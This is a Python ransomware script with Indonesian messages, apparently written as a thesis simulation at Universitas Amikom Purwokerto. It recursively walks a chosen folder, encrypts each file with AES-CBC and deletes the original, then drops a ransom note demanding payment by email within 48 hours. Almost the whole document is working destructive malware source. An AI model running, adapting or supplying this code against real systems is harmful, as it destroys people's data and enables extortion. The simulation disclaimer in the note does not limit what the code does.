import os
import sys
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def install_dependencies():
    try:
        import Crypto
    except ModuleNotFoundError:
        print("Modul 'pycryptodome' tidak ditemukan, menginstal sekarang...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        print("Instalasi selesai, silakan jalankan ulang skrip.")
        sys.exit()

install_dependencies()

def pad_data(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt_file(dataFile, key):
    try:
        with open(dataFile, 'rb') as f:
            data = f.read()
        
        padded_data = pad_data(data)
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        ciphertext = cipher.encrypt(padded_data)
        
        encryptedFile = str(dataFile) + '.encrypt'
        with open(encryptedFile, 'wb') as f:
            f.write(iv + ciphertext)
        
        os.remove(dataFile)
    except Exception as e:
        print(f"Terjadi kesalahan saat mengenkripsi file {dataFile}: {e}")

def create_ransom_note(directory):
    ransom_file = os.path.join(directory, 'README_FOR_DECRYPT.txt')
    ransom_message = """File Anda telah dienkripsi!\n
                        Untuk memulihkan file Anda, Anda perlu membayar biaya dekripsi.\n
                        Cara memulihkan file Anda:\n
                        1. Kirim email ke: pentesternegrisipil@gmail.com.\n
                        2. Sertakan ID Anda: 123-456-ABCD-EFGH.\n
                        3. Tunggu instruksi lebih lanjut.\n
                        PERINGATAN!!\n
                        1. Jangan mencoba mendekripsi file sendiri; itu bisa menyebabkan kehilangan data permanen.\n
                        2. Pembayaran harus dilakukan dalam waktu 48 jam untuk menghindari biaya tambahan.\n
                        NB: INI HANYA UNTUK SIMULASI TUGAS AKHIR(SKRIPSI) UNIVERSITAS AMIKOM PURWOKERTO"""
    try:
        with open(ransom_file, 'w', encoding='utf-8') as f:
            f.write(ransom_message)
    except Exception as e:
        print(f"Terjadi kesalahan saat membuat catatan tebusan: {e}")

# Generate atau ambil kunci enkripsi dari skrip
KEY_FILE = 'encryption_key_256.bin'
if not os.path.exists(KEY_FILE):
    KEY = get_random_bytes(32)
    with open(KEY_FILE, 'wb') as f:
        f.write(KEY.hex().encode('utf-8'))
else:
    with open(KEY_FILE, 'rb') as f:
        KEY = bytes.fromhex(f.read().decode('utf-8'))

# Enkripsi file dalam direktori
directory = input("Pilih folder untuk menyimpan: ").strip()
if not os.path.exists(directory) or not os.path.isdir(directory):
    print("Path tidak valid atau bukan direktori.")
    sys.exit(1)

excludeExtension = ['.py', '.encrypt', '.pem', '.exe', '.txt', 'encryption_key_256.bin']

for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    if filePath.name == KEY_FILE or fileType in excludeExtension:
        continue
    encrypt_file(filePath, KEY)

create_ransom_note(directory)
print("Semua file telah dienkripsi.")
